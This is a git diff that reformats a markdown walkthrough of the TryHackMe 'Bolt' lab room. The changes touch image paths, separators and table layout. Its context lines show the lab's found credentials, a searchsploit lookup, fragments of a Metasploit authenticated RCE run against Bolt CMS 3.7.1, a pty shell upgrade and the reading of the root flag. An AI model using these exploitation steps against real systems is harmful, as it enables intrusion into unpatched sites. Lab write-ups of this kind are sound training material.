@@ -1,20 +1,20 @@
 # Bolt
 
-![tryhackme.com - © TryHackMe](<../../../../../.gitbook/assets/tryhackme-logo-small (6).png>)
+![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
 
-***
+---
 
 ## Intro
 
-| Room Info            | ![](../../../../../.gitbook/assets/bolt.png) |
-| -------------------- | -------------------------------------------- |
-| 🔗 Name              | [Bolt](https://tryhackme.com/room/bolt)      |
-| 🎯 Target IP         | `10.10.218.91`                               |
-| 📈 Difficulty level  | 🟢Easy                                       |
-| 💲 Subscription type | Free                                         |
-| 🐧 OS                | Linux                                        |
+| Room Info           | ![](.gitbook/assets/bolt.png)           |
+| :------------------ | --------------------------------------- |
+| 🔗 Name              | [Bolt](https://tryhackme.com/room/bolt) |
+| 🎯 Target IP         | `10.10.218.91`                          |
+| 📈 Difficulty level  | 🟢Easy                                   |
+| 💲 Subscription type | Free                                    |
+| 🐧 OS                | Linux                                   |
 
-***
+---
 
 ## Recon
 
@@ -103,24 +103,24 @@ nmap -sV -sC -Pn -oA bolt bolt.thm
 
 Enumerate the Bolt web application.
 
-![](../../../../../.gitbook/assets/image-20230515194324231.png)
+![](.gitbook/assets/image-20230515194324231.png)
 
 > 📌 `bolt`:`boltadmin123`
 
 Find the Bolt CMS login page
 
-![](../../../../../.gitbook/assets/image-20230515194049520.png)
+![](.gitbook/assets/image-20230515194049520.png)
 
 Navigate to
 
-* `http://bolt.thm:8000/bolt/login`
-* and use the `bolt` credentials
+- `http://bolt.thm:8000/bolt/login`
+- and use the `bolt` credentials
 
 Once logged in, the Bolt version is at the bottom of the page.
 
 > 📌 `Bolt 3.7.1`
 
-***
+---
 
 ## Exploitation
 
@@ -130,7 +130,7 @@ searchsploit bolt 3.7 -w
 # EDB-ID is 48296
 ```
 
-![](../../../../../.gitbook/assets/image-20230515194653700.png)
+![](.gitbook/assets/image-20230515194653700.png)
 
 Use Metasploit to exploit the [**`Authenticated Remote Code Execution`**](https://www.exploit-db.com/exploits/48296) Bolt vulnerability
 
@@ -147,7 +147,7 @@ set PASSWORD boltadmin123
 run
 ```
 
-![root shell](../../../../../.gitbook/assets/image-20230515195717170.png)
+![root shell](.gitbook/assets/image-20230515195717170.png)
 
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -157,6 +157,7 @@ cat /root/flag.txt
 THM{w****************************
 ```
 
-![](../../../../../.gitbook/assets/2024-10-20_22-14-18_761.png)
+![](.gitbook/assets/2024-10-20_22-14-18_761.png)
 
-***
+------
+
